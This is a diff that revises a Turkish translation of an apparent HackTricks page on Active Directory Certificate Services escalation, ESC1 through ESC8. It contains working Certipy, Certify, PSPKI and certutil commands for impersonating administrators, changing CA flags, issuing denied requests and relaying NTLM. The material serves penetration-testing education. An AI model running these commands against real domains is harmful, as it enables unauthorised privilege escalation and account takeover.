@@ -2,10 +2,6 @@
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://websec.nl/" %}
-
 **Bu, gönderilerin yükselme teknikleri bölümlerinin bir özetidir:**
 
 - [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
@@ -23,16 +19,16 @@
 - **Yetkili personelden imza gerekmemektedir.**
 - **Sertifika şablonlarındaki güvenlik tanımlayıcıları aşırı izinlidir, bu da düşük ayrıcalıklı kullanıcıların kayıt hakları elde etmesine olanak tanır.**
 - **Sertifika şablonları, kimlik doğrulamayı kolaylaştıran EKU'ları tanımlamak için yapılandırılmıştır:**
-- Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0) veya hiç EKU (SubCA) gibi Genişletilmiş Anahtar Kullanımı (EKU) tanımlayıcıları dahildir.
-- **Sertifika İmzalama Talebi (CSR) içinde subjectAltName ekleme yeteneği şablon tarafından izin verilmektedir:**
-- Active Directory (AD), bir sertifikada kimlik doğrulama için subjectAltName (SAN) varsa öncelik verir. Bu, CSR'de SAN belirterek, herhangi bir kullanıcıyı (örneğin, bir alan yöneticisi) taklit etmek için bir sertifika talep edilebileceği anlamına gelir. Talep edenin SAN belirleyip belirleyemeyeceği, sertifika şablonunun AD nesnesinde `mspki-certificate-name-flag` özelliği aracılığıyla gösterilmektedir. Bu özellik bir bitmask'tır ve `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` bayrağının varlığı, talep edenin SAN'ı belirtmesine izin verir.
+- Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0) veya no EKU (SubCA) gibi Genişletilmiş Anahtar Kullanımı (EKU) tanımlayıcıları dahildir.
+- **Talep edenlerin Sertifika İmzalama Talebi (CSR) içinde bir subjectAltName dahil etme yeteneği şablon tarafından izin verilmektedir:**
+- Active Directory (AD), kimlik doğrulama için bir sertifikada subjectAltName (SAN) varsa bunu önceliklendirir. Bu, CSR'de SAN belirterek, herhangi bir kullanıcıyı (örneğin, bir alan yöneticisi) taklit etmek için bir sertifika talep edilebileceği anlamına gelir. Talep edenin bir SAN belirleyip belirleyemeyeceği, sertifika şablonunun AD nesnesinde `mspki-certificate-name-flag` özelliği aracılığıyla belirtilir. Bu özellik bir bitmask'tır ve `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` bayrağının varlığı, talep edenin SAN'ı belirtmesine izin verir.
 
 > [!CAUTION]
-> Belirtilen yapılandırma, düşük ayrıcalıklı kullanıcıların istedikleri herhangi bir SAN ile sertifika talep etmelerine izin verir, bu da Kerberos veya SChannel aracılığıyla herhangi bir alan ilkesinin kimlik doğrulamasını sağlar.
+> Belirtilen yapılandırma, düşük ayrıcalıklı kullanıcıların istedikleri herhangi bir SAN ile sertifika talep etmelerine izin vererek, Kerberos veya SChannel aracılığıyla herhangi bir alan ilkesinin kimliğini doğrulamalarını sağlar.
 
 Bu özellik, bazen ürünler veya dağıtım hizmetleri tarafından HTTPS veya ana bilgisayar sertifikalarının anında oluşturulmasını desteklemek için veya bir anlayış eksikliği nedeniyle etkinleştirilir.
 
-Bu seçeneği kullanarak bir sertifika oluşturmanın bir uyarı tetiklediği, mevcut bir sertifika şablonunun (örneğin, `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` etkin olan `WebServer` şablonu) kopyalanıp ardından bir kimlik doğrulama OID'si eklemek için değiştirilmesi durumunda böyle bir durumun söz konusu olmadığı belirtilmektedir.
+Bu seçeneği kullanarak bir sertifika oluşturmanın bir uyarı tetiklediği, mevcut bir sertifika şablonunun (örneğin, `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` etkin olan `WebServer` şablonu) kopyalanıp ardından bir kimlik doğrulama OID'si eklemek için değiştirilmesi durumunda böyle bir uyarının olmadığı belirtilmektedir.
 
 ### Suistimal
 
@@ -53,7 +49,7 @@ certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.lo
 ```
 Windows ikili dosyaları "Certreq.exe" ve "Certutil.exe", PFX oluşturmak için kullanılabilir: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee
 
-AD Ormanı'nın yapılandırma şemasındaki sertifika şablonlarının, özellikle onay veya imza gerektirmeyen, Client Authentication veya Smart Card Logon EKU'suna sahip olan ve `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` bayrağı etkinleştirilmiş olanların listelenmesi, aşağıdaki LDAP sorgusunu çalıştırarak gerçekleştirilebilir:
+AD Ormanı'nın yapılandırma şemasındaki sertifika şablonlarının, özellikle onay veya imza gerektirmeyen, Client Authentication veya Smart Card Logon EKU'suna sahip olan ve `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` bayrağı etkinleştirilmiş olanların belirlenmesi, aşağıdaki LDAP sorgusunu çalıştırarak gerçekleştirilebilir:
 ```
 (&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
 ```
@@ -67,13 +63,13 @@ AD Ormanı'nın yapılandırma şemasındaki sertifika şablonlarının, özelli
 2. Yönetici onayı gereksinimi devre dışı bırakılır.
 3. Yetkili imzaların gerekliliği atlanır.
 4. Sertifika şablonundaki aşırı izinli bir güvenlik tanımlayıcısı, düşük ayrıcalıklı kullanıcılara sertifika kayıt hakları verir.
-5. **Sertifika şablonu, Any Purpose EKU'yu veya hiç EKU'yu içerecek şekilde tanımlanmıştır.**
+5. **Sertifika şablonu, Any Purpose EKU veya hiç EKU içerecek şekilde tanımlanmıştır.**
 
 **Any Purpose EKU**, bir saldırganın **herhangi bir amaçla** sertifika almasına izin verir; bu, istemci kimlik doğrulaması, sunucu kimlik doğrulaması, kod imzalama vb. dahil. **ESC3 için kullanılan aynı teknik**, bu senaryoyu istismar etmek için de kullanılabilir.
 
-**Hiç EKU'su olmayan** sertifikalar, alt CA sertifikaları olarak hareket eder ve **herhangi bir amaçla** istismar edilebilir ve **yeni sertifikaları imzalamak için de kullanılabilir**. Bu nedenle, bir saldırgan, bir alt CA sertifikası kullanarak yeni sertifikalarda keyfi EKU'lar veya alanlar belirtebilir.
+**Hiç EKU içermeyen** sertifikalar, alt CA sertifikaları olarak hareket eder ve **herhangi bir amaçla** istismar edilebilir ve **yeni sertifikaları imzalamak için de kullanılabilir**. Bu nedenle, bir saldırgan, bir alt CA sertifikası kullanarak yeni sertifikalarda keyfi EKU'lar veya alanlar belirtebilir.
 
-Ancak, **alan kimlik doğrulaması** için oluşturulan yeni sertifikalar, alt CA **`NTAuthCertificates`** nesnesi tarafından güvenilir değilse çalışmayacaktır; bu, varsayılan ayardır. Yine de, bir saldırgan hala **herhangi bir EKU ile yeni sertifikalar** ve keyfi sertifika değerleri oluşturabilir. Bunlar, potansiyel olarak **kötüye kullanılabilir** ve ağdaki diğer uygulamalar için önemli sonuçlar doğurabilir (örneğin, kod imzalama, sunucu kimlik doğrulaması vb.) ve SAML, AD FS veya IPSec gibi uygulamalar üzerinde önemli etkileri olabilir.
+Ancak, **alan kimlik doğrulaması** için oluşturulan yeni sertifikalar, alt CA **`NTAuthCertificates`** nesnesi tarafından güvenilir değilse çalışmayacaktır; bu, varsayılan ayardır. Yine de, bir saldırgan hala **herhangi bir EKU ile yeni sertifikalar** ve keyfi sertifika değerleri oluşturabilir. Bunlar, potansiyel olarak geniş bir yelpazede amaçlar için **kötüye kullanılabilir** (örneğin, kod imzalama, sunucu kimlik doğrulaması vb.) ve SAML, AD FS veya IPSec gibi ağdaki diğer uygulamalar için önemli sonuçlar doğurabilir.
 
 AD Ormanı'nın yapılandırma şemasında bu senaryoya uyan şablonları listelemek için aşağıdaki LDAP sorgusu çalıştırılabilir:
 ```
@@ -85,9 +81,9 @@ AD Ormanı'nın yapılandırma şemasında bu senaryoya uyan şablonları listel
 
 Bu senaryo, birincisi ve ikincisi gibi ancak **farklı bir EKU** (Sertifika Talep Ajanı) ve **2 farklı şablon** **istismar ederek** (bu nedenle 2 set gereksinimi vardır),
 
-**Sertifika Talep Ajanı EKU** (OID 1.3.6.1.4.1.311.20.2.1), Microsoft belgelerinde **Kayıt Ajanı** olarak bilinir, bir yetkilinin **başka bir kullanıcı adına** bir **sertifika** için **kayıt olmasına** izin verir.
+**Sertifika Talep Ajanı EKU** (OID 1.3.6.1.4.1.311.20.2.1), Microsoft belgelerinde **Kayıt Ajanı** olarak bilinir, bir kullanıcının **başka bir kullanıcı adına** **sertifika** için **kayıt olmasına** izin verir.
 
-**“kayıt ajanı”** böyle bir **şablona** kayıt olur ve elde edilen **sertifikayı diğer kullanıcı adına bir CSR'yi eş imzalamak için kullanır**. Daha sonra **eş imzalı CSR'yi** CA'ya **gönderir**, **“adına kayıt olma”** izni veren bir **şablona** kayıt olur ve CA, **“diğer” kullanıcıya ait bir sertifika** ile yanıt verir.
+**“kayıt ajanı”** böyle bir **şablona** kayıt olur ve elde edilen **sertifikayı diğer kullanıcı adına bir CSR'yi eş-imzalamak için** kullanır. Daha sonra **eş-imzalı CSR'yi** CA'ya gönderir, **“adına kayıt olma”** izni veren bir **şablona** kayıt olur ve CA, **“diğer” kullanıcıya ait bir sertifika** ile yanıt verir.
 
 **Gereksinimler 1:**
 
@@ -95,7 +91,7 @@ Bu senaryo, birincisi ve ikincisi gibi ancak **farklı bir EKU** (Sertifika Tale
 - Yönetici onayı gereksinimi atlanır.
 - Yetkili imzalar için bir gereksinim yoktur.
 - Sertifika şablonunun güvenlik tanımlayıcısı aşırı derecede izin vericidir, düşük ayrıcalıklı kullanıcılara kayıt hakları verir.
-- Sertifika şablonu, diğer yetkililer adına diğer sertifika şablonlarının talep edilmesini sağlayan Sertifika Talep Ajanı EKU'sunu içerir.
+- Sertifika şablonu, diğer ilkeler adına diğer sertifika şablonlarının talep edilmesini sağlayan Sertifika Talep Ajanı EKU'sunu içerir.
 
 **Gereksinimler 2:**
 
@@ -129,7 +125,7 @@ Ancak, CA'lar için **varsayılan** ayarın “**Kayıt ajanlarını kısıtlama
 
 ### **Açıklama**
 
-**Sertifika şablonları** üzerindeki **güvenlik tanımlayıcı**, şablonla ilgili **AD ilkeleri** tarafından sahip olunan **izinleri** tanımlar.
+**Sertifika şablonları** üzerindeki **güvenlik tanımlayıcı**, şablonla ilgili olarak belirli **AD ilkeleri** tarafından sahip olunan **izinleri** tanımlar.
 
 Bir **saldırgan**, bir **şablonu** **değiştirmek** ve **önceki bölümlerde** belirtilen herhangi bir **istismar edilebilir yanlış yapılandırmayı** **kurmak** için gerekli **izinlere** sahip olursa, ayrıcalık yükseltmesi sağlanabilir.
 
@@ -137,9 +133,9 @@ Sertifika şablonlarına uygulanabilir önemli izinler şunlardır:
 
 - **Sahip:** Nesne üzerinde örtük kontrol sağlar, herhangi bir niteliği değiştirme yetkisi verir.
 - **TamKontrol:** Nesne üzerinde tam yetki sağlar, herhangi bir niteliği değiştirme yeteneği dahil.
-- **YazSahibi:** Nesnenin sahibini saldırganın kontrolündeki bir ilkeye değiştirme izni verir.
-- **YazDacl:** Erişim kontrollerinin ayarlanmasına izin verir, potansiyel olarak bir saldırgana TamKontrol verebilir.
-- **YazNitelik:** Herhangi bir nesne niteliğinin düzenlenmesine yetki verir.
+- **SahibiYaz:** Nesnenin sahibini saldırganın kontrolündeki bir ilkeye değiştirme izni verir.
+- **DaclYaz:** Erişim kontrollerinin ayarlanmasına izin verir, potansiyel olarak bir saldırgana TamKontrol verebilir.
+- **ÖzellikYaz:** Herhangi bir nesne özelliğinin düzenlenmesine yetki verir.
 
 ### Suistimal
 
@@ -147,7 +143,7 @@ Sertifika şablonlarına uygulanabilir önemli izinler şunlardır:
 
 <figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>
 
-ESC4, bir kullanıcının bir sertifika şablonu üzerinde yazma ayrıcalıklarına sahip olduğu durumdur. Bu, örneğin, sertifika şablonunun yapılandırmasını değiştirmek için istismar edilebilir ve şablonu ESC1'e karşı savunmasız hale getirebilir.
+ESC4, bir kullanıcının bir sertifika şablonu üzerinde yazma ayrıcalıklarına sahip olduğu durumdur. Bu, örneğin, sertifika şablonunun yapılandırmasını geçersiz kılmak için istismar edilebilir ve şablonu ESC1'e karşı savunmasız hale getirebilir.
 
 Yukarıdaki yolda görüldüğü gibi, yalnızca `JOHNPC` bu ayrıcalıklara sahiptir, ancak kullanıcı `JOHN`'ın `JOHNPC`'ye yeni `AddKeyCredentialLink` kenarı vardır. Bu teknik sertifikalarla ilgili olduğundan, bu saldırıyı da uyguladım, bu da [Gölge Kimlik Bilgileri](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) olarak bilinir. İşte kurbanın NT hash'ini almak için Certipy'nin `shadow auto` komutunun küçük bir önizlemesi.
 ```bash
@@ -168,11 +164,11 @@ certipy template -username john@corp.local -password Passw0rd -template ESC4-Tes
 
 ### Explanation
 
-Bağlantılı ACL tabanlı ilişkilerin geniş ağı, sertifika şablonları ve sertifika otoritesinin ötesinde birkaç nesneyi içermektedir ve bu, tüm AD CS sisteminin güvenliğini etkileyebilir. Güvenliği önemli ölçüde etkileyebilecek bu nesneler şunlardır:
+Birçok nesneyi, sertifika şablonları ve sertifika otoritesinin ötesinde, içeren ACL tabanlı ilişkilerin geniş ağı, tüm AD CS sisteminin güvenliğini etkileyebilir. Güvenliği önemli ölçüde etkileyebilecek bu nesneler şunları kapsar:
 
-- CA sunucusunun AD bilgisayar nesnesi, S4U2Self veya S4U2Proxy gibi mekanizmalar aracılığıyla tehlikeye girebilir.
+- S4U2Self veya S4U2Proxy gibi mekanizmalar aracılığıyla tehlikeye girebilecek CA sunucusunun AD bilgisayar nesnesi.
 - CA sunucusunun RPC/DCOM sunucusu.
-- `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>` belirli konteyner yolundaki herhangi bir alt AD nesnesi veya konteyner. Bu yol, Sertifika Şablonları konteyneri, Sertifikasyon Otoriteleri konteyneri, NTAuthCertificates nesnesi ve Kayıt Hizmetleri Konteyneri gibi konteynerler ve nesnelerle sınırlı olmamakla birlikte, bunları içerir.
+- Belirli bir konteyner yolunda `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>` bulunan herhangi bir soyundan gelen AD nesnesi veya konteyner. Bu yol, Sertifika Şablonları konteyneri, Sertifikasyon Otoriteleri konteyneri, NTAuthCertificates nesnesi ve Kayıt Hizmetleri Konteyneri gibi konteynerler ve nesnelerle sınırlı olmamakla birlikte, bunları içerir.
 
 PKI sisteminin güvenliği, düşük ayrıcalıklı bir saldırgan bu kritik bileşenlerden herhangi birine kontrol sağlamayı başarırsa tehlikeye girebilir.
 
@@ -180,9 +176,9 @@ PKI sisteminin güvenliği, düşük ayrıcalıklı bir saldırgan bu kritik bil
 
 ### Explanation
 
-[**CQure Academy gönderisinde**](https://cqureacademy.com/blog/enhanced-key-usage) tartışılan konu, Microsoft tarafından belirtilen **`EDITF_ATTRIBUTESUBJECTALTNAME2`** bayrağının etkilerini de kapsamaktadır. Bu yapılandırma, bir Sertifikasyon Otoritesi (CA) üzerinde etkinleştirildiğinde, **herhangi bir istek** için **konu alternatif adı** içinde **kullanıcı tanımlı değerlerin** dahil edilmesine izin verir; bu, Active Directory®'den oluşturulanları da içerir. Sonuç olarak, bu düzenleme, bir **saldırganın** **herhangi bir şablon** aracılığıyla kayıt olmasına olanak tanır—özellikle **ayrıcalıksız** kullanıcı kaydına açık olanlar, standart Kullanıcı şablonu gibi. Sonuç olarak, bir sertifika güvence altına alınabilir ve saldırganın bir alan yöneticisi veya alan içindeki **herhangi bir aktif varlık** olarak kimlik doğrulaması yapmasına olanak tanır.
+[**CQure Academy gönderisinde**](https://cqureacademy.com/blog/enhanced-key-usage) tartışılan konu, Microsoft tarafından belirtilen **`EDITF_ATTRIBUTESUBJECTALTNAME2`** bayrağının etkilerini de kapsamaktadır. Bu yapılandırma, bir Sertifikasyon Otoritesi (CA) üzerinde etkinleştirildiğinde, **herhangi bir talep** için **kullanıcı tanımlı değerlerin** **konu alternatif adı** içine dahil edilmesine izin verir; bu, Active Directory®'den oluşturulanları da içerir. Sonuç olarak, bu düzenleme, bir **saldırganın** **herhangi bir şablon** aracılığıyla kayıt olmasına olanak tanır; özellikle **ayrıcalıksız** kullanıcı kaydına açık olanlar, standart Kullanıcı şablonu gibi. Sonuç olarak, bir sertifika güvence altına alınabilir ve saldırganın bir alan yöneticisi veya alan içindeki **herhangi bir aktif varlık** olarak kimlik doğrulaması yapmasına olanak tanır.
 
-**Not**: Sertifika İmzalama Talebi (CSR) içine **alternatif adların** eklenmesi için `certreq.exe` içindeki `-attrib "SAN:"` argümanı aracılığıyla kullanılan yaklaşım, ESC1'deki SAN'ların istismar stratejisinden **farklılık** göstermektedir. Burada, fark, **hesap bilgilerinin nasıl kapsüllendiği** ile ilgilidir—bir sertifika niteliği içinde, bir uzantı yerine.
+**Not**: `certreq.exe` içindeki `-attrib "SAN:"` argümanı aracılığıyla bir Sertifika İmzalama Talebine (CSR) **alternatif adların** eklenmesi yaklaşımı, ESC1'deki SAN'ların istismar stratejisinden bir **fark** sunar. Burada, fark, **hesap bilgilerinin nasıl kapsüllendiği** ile ilgilidir; bir sertifika niteliği içinde, bir uzantı yerine.
 
 ### Abuse
 
@@ -213,7 +209,7 @@ certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJ
 ```
 > [!WARNING]
 > Mayıs 2022 güvenlik güncellemelerinden sonra, yeni verilen **sertifikalar**, **istek sahibinin `objectSid` özelliğini** içeren bir **güvenlik uzantısı** içerecektir. ESC1 için, bu SID belirtilen SAN'dan türetilir. Ancak, **ESC6** için, SID **istek sahibinin `objectSid`** değerini yansıtır, SAN'ı değil.\
-> ESC6'yi istismar etmek için, sistemin ESC10'a (Zayıf Sertifika Eşleştirmeleri) karşı hassas olması gerekmektedir; bu, **yeni güvenlik uzantısına göre SAN'ı** önceliklendirir.
+> ESC6'yi istismar etmek için, sistemin ESC10'a (Zayıf Sertifika Eşleştirmeleri) karşı hassas olması gerekmektedir; bu, **yeni güvenlik uzantısından ziyade SAN'ı** önceliklendirir.
 
 ## Hassas Sertifika Otoritesi Erişim Kontrolü - ESC7
 
@@ -221,21 +217,21 @@ certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJ
 
 #### Açıklama
 
-Bir sertifika otoritesi için erişim kontrolü, CA eylemlerini yöneten bir dizi izin aracılığıyla sürdürülmektedir. Bu izinler, `certsrv.msc`'ye erişerek, bir CA'ya sağ tıklayarak, özellikleri seçerek ve ardından Güvenlik sekmesine giderek görüntülenebilir. Ayrıca, izinler PSPKI modülü kullanılarak şu komutlarla sıralanabilir:
+Bir sertifika otoritesinin erişim kontrolü, CA eylemlerini yöneten bir dizi izin aracılığıyla sürdürülmektedir. Bu izinler, `certsrv.msc` erişilerek, bir CA'ya sağ tıklanarak, özellikler seçilerek ve ardından Güvenlik sekmesine gidilerek görüntülenebilir. Ayrıca, izinler PSPKI modülü kullanılarak şu komutlarla sıralanabilir:
 ```bash
 Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
 ```
-Bu, "CA yöneticisi" ve "Sertifika Yöneticisi" rollerine karşılık gelen **`ManageCA`** ve **`ManageCertificates`** gibi temel haklar hakkında içgörüler sağlar.
+Bu, "CA yöneticisi" ve "Sertifika Yöneticisi" rollerine karşılık gelen **`ManageCA`** ve **`ManageCertificates`** gibi temel haklar hakkında bilgiler sunar.
 
 #### Kötüye Kullanım
 
-Bir sertifika otoritesinde **`ManageCA`** haklarına sahip olmak, yetkilinin ayarları uzaktan PSPKI kullanarak manipüle etmesine olanak tanır. Bu, herhangi bir şablonda SAN belirtimine izin vermek için **`EDITF_ATTRIBUTESUBJECTALTNAME2`** bayrağını değiştirmeyi içerir; bu, alan yükseltmesinin kritik bir yönüdür.
+Bir sertifika otoritesinde **`ManageCA`** haklarına sahip olmak, yetkilinin ayarları uzaktan PSPKI kullanarak manipüle etmesine olanak tanır. Bu, herhangi bir şablonda SAN belirtimine izin vermek için **`EDITF_ATTRIBUTESUBJECTALTNAME2`** bayrağını açıp kapatmayı içerir; bu, alan yükseltmesinin kritik bir yönüdür.
 
 Bu sürecin basitleştirilmesi, doğrudan GUI etkileşimi olmadan değişikliklere izin veren PSPKI’nin **Enable-PolicyModuleFlag** cmdlet'inin kullanımıyla mümkündür.
 
-**`ManageCertificates`** haklarına sahip olmak, bekleyen taleplerin onaylanmasını kolaylaştırır ve "CA sertifika yöneticisi onayı" korumasını etkili bir şekilde aşar.
+**`ManageCertificates`** haklarına sahip olmak, bekleyen taleplerin onaylanmasını kolaylaştırır ve böylece "CA sertifika yöneticisi onayı" korumasını etkili bir şekilde aşar.
 
-**Certify** ve **PSPKI** modüllerinin bir kombinasyonu, bir sertifika talep etmek, onaylamak ve indirmek için kullanılabilir:
+Bir sertifika talep etmek, onaylamak ve indirmek için **Certify** ve **PSPKI** modüllerinin bir kombinasyonu kullanılabilir:
 ```powershell
 # Request a certificate that will require an approval
 Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
@@ -266,7 +262,7 @@ Gereksinimler:
 - **`Manage Certificates`** izni (bu **`ManageCA`** üzerinden verilebilir)
 - Sertifika şablonu **`SubCA`** **etkinleştirilmiş** olmalıdır (bu **`ManageCA`** üzerinden etkinleştirilebilir)
 
-Teknik, `Manage CA` _ve_ `Manage Certificates` erişim hakkına sahip kullanıcıların **başarısız sertifika talepleri** **yayınlayabilmesi** gerçeğine dayanmaktadır. **`SubCA`** sertifika şablonu **ESC1'e** **duyarlıdır**, ancak **yalnızca yöneticiler** şablona kaydolabilir. Böylece, bir **kullanıcı** **`SubCA`**'ya kaydolmak için **talep** edebilir - bu **reddedilecektir** - ancak **sonrasında yönetici tarafından verilecektir**.
+Teknik, `Manage CA` _ve_ `Manage Certificates` erişim hakkına sahip kullanıcıların **başarısız sertifika talepleri** **yayınlayabilmesi** gerçeğine dayanmaktadır. **`SubCA`** sertifika şablonu **ESC1'e** **duyarlıdır**, ancak **sadece yöneticiler** şablona kaydolabilir. Böylece, bir **kullanıcı** **`SubCA`**'ya kaydolma **talebinde** bulunabilir - bu **reddedilecektir** - ancak **sonrasında yönetici tarafından verilecektir**.
 
 #### Suistimal
 
@@ -303,14 +299,14 @@ Would you like to save the private key? (y/N) y
 [*] Saved private key to 785.key
 [-] Failed to request certificate
 ```
-**`Manage CA` ve `Manage Certificates`** ile ardından **başarısız sertifika** talebini `ca` komutu ve `-issue-request <request ID>` parametresi ile **verebiliriz**.
+**`CA Yönet` ve `Sertifikaları Yönet`** ile ardından **başarısız sertifika** talebini `ca` komutu ve `-issue-request <request ID>` parametresi ile **verebiliriz**.
 ```bash
 certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
 Certipy v4.0.0 - by Oliver Lyak (ly4k)
 
 [*] Successfully issued certificate
 ```
-Ve nihayet, `req` komutunu ve `-retrieve <request ID>` parametresini kullanarak **verilen sertifikayı** alabiliriz.
+Ve nihayet, **verilen sertifikayı** `req` komutu ve `-retrieve <request ID>` parametresi ile **alabiliriz**.
 ```bash
 certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
 Certipy v4.0.0 - by Oliver Lyak (ly4k)
@@ -327,22 +323,22 @@ Certipy v4.0.0 - by Oliver Lyak (ly4k)
 ### Açıklama
 
 > [!NOTE]
-> **AD CS yüklü** ortamlarda, eğer **web kayıt noktası zayıf** ise ve en az bir **sertifika şablonu yayınlanmışsa** ve **alan bilgisayar kaydı ve istemci kimlik doğrulamasına** izin veriyorsa (varsayılan **`Machine`** şablonu gibi), **spooler servisi aktif olan herhangi bir bilgisayarın bir saldırgan tarafından tehlikeye atılması mümkün hale gelir**!
+> **AD CS yüklü** ortamlarda, eğer **web kayıt noktası zayıf** bir noktaya sahipse ve en az bir **sertifika şablonu yayımlanmışsa** ve **alan bilgisayarı kaydı ve istemci kimlik doğrulaması** iznine sahipse (varsayılan **`Machine`** şablonu gibi), **spooler servisi aktif olan herhangi bir bilgisayarın bir saldırgan tarafından tehlikeye atılması** mümkün hale gelir!
 
-AD CS, yöneticilerin yükleyebileceği ek sunucu rolleri aracılığıyla sunulan birkaç **HTTP tabanlı kayıt yöntemi** desteklemektedir. HTTP tabanlı sertifika kaydı için bu arayüzler **NTLM relay saldırılarına** karşı hassastır. Bir saldırgan, **tehlikeye atılmış bir makineden, gelen NTLM aracılığıyla kimlik doğrulayan herhangi bir AD hesabını taklit edebilir**. Kurban hesabını taklit ederken, bu web arayüzleri bir saldırgan tarafından **`User` veya `Machine` sertifika şablonlarını kullanarak bir istemci kimlik doğrulama sertifikası talep etmek için erişilebilir**.
+AD CS tarafından desteklenen birkaç **HTTP tabanlı kayıt yöntemi** bulunmaktadır ve bunlar yöneticilerin yükleyebileceği ek sunucu rolleri aracılığıyla sunulmaktadır. HTTP tabanlı sertifika kaydı için bu arayüzler **NTLM relay saldırılarına** karşı hassastır. Bir saldırgan, **tehlikeye atılmış bir makineden, gelen NTLM aracılığıyla kimlik doğrulayan herhangi bir AD hesabını taklit edebilir**. Kurban hesabını taklit ederken, bu web arayüzleri bir saldırgan tarafından **`User` veya `Machine` sertifika şablonlarını kullanarak bir istemci kimlik doğrulama sertifikası talep etmek için erişilebilir**.
 
 - **Web kayıt arayüzü** ( `http://<caserver>/certsrv/` adresinde bulunan eski bir ASP uygulaması), varsayılan olarak yalnızca HTTP'ye ayarlanmıştır ve NTLM relay saldırılarına karşı koruma sağlamaz. Ayrıca, yalnızca NTLM kimlik doğrulamasına izin vererek, Kerberos gibi daha güvenli kimlik doğrulama yöntemlerinin uygulanamaz hale gelmesine neden olur.
-- **Sertifika Kayıt Servisi** (CES), **Sertifika Kayıt Politikası** (CEP) Web Servisi ve **Ağ Cihazı Kayıt Servisi** (NDES) varsayılan olarak, yetkilendirme HTTP başlıkları aracılığıyla müzakere kimlik doğrulamasını destekler. Müzakere kimlik doğrulaması **hem** Kerberos'u hem de **NTLM**'yi destekleyerek, bir saldırganın relay saldırıları sırasında **NTLM'ye düşürmesine** olanak tanır. Bu web hizmetleri varsayılan olarak HTTPS'yi etkinleştirse de, HTTPS tek başına **NTLM relay saldırılarına karşı koruma sağlamaz**. HTTPS hizmetleri için NTLM relay saldırılarından korunma, yalnızca HTTPS'nin kanal bağlama ile birleştirilmesiyle mümkündür. Ne yazık ki, AD CS, kanal bağlama için gerekli olan IIS'de Genişletilmiş Koruma için Kimlik Doğrulamasını etkinleştirmemektedir.
+- **Sertifika Kayıt Servisi** (CES), **Sertifika Kayıt Politikası** (CEP) Web Servisi ve **Ağ Cihazı Kayıt Servisi** (NDES) varsayılan olarak, yetkilendirme HTTP başlıkları aracılığıyla müzakere kimlik doğrulamasını destekler. Müzakere kimlik doğrulaması **hem** Kerberos'u hem de **NTLM**'yi destekleyerek, bir saldırganın relay saldırıları sırasında **NTLM'ye düşürmesine** olanak tanır. Bu web hizmetleri varsayılan olarak HTTPS'yi etkinleştirse de, HTTPS tek başına **NTLM relay saldırılarına karşı koruma sağlamaz**. HTTPS hizmetleri için NTLM relay saldırılarından korunma, HTTPS'nin kanal bağlama ile birleştirilmesiyle mümkündür. Ne yazık ki, AD CS, kanal bağlama için gerekli olan IIS'de Genişletilmiş Koruma için Kimlik Doğrulamasını etkinleştirmemektedir.
 
-NTLM relay saldırılarındaki yaygın bir **sorun**, **NTLM oturumlarının kısa süresi** ve saldırganın **NTLM imzası gerektiren** hizmetlerle etkileşimde bulunamamasıdır.
+NTLM relay saldırılarındaki yaygın bir **sorun**, **NTLM oturumlarının kısa süresi** ve saldırganın **NTLM imzalamayı** gerektiren hizmetlerle etkileşimde bulunamamasıdır.
 
-Yine de, bu sınırlama, bir kullanıcı için bir sertifika edinmek amacıyla bir NTLM relay saldırısını kullanarak aşılmaktadır, çünkü sertifikanın geçerlilik süresi oturumun süresini belirler ve sertifika, **NTLM imzası gerektiren** hizmetlerle kullanılabilir. Çalınan bir sertifikanın nasıl kullanılacağına dair talimatlar için bakınız:
+Yine de, bu sınırlama, bir kullanıcı için bir sertifika edinmek amacıyla bir NTLM relay saldırısını kullanarak aşılmaktadır, çünkü sertifikanın geçerlilik süresi oturumun süresini belirler ve sertifika, **NTLM imzalamayı** zorunlu kılan hizmetlerle kullanılabilir. Çalınan bir sertifikanın nasıl kullanılacağına dair talimatlar için bakınız:
 
 {{#ref}}
 account-persistence.md
 {{#endref}}
 
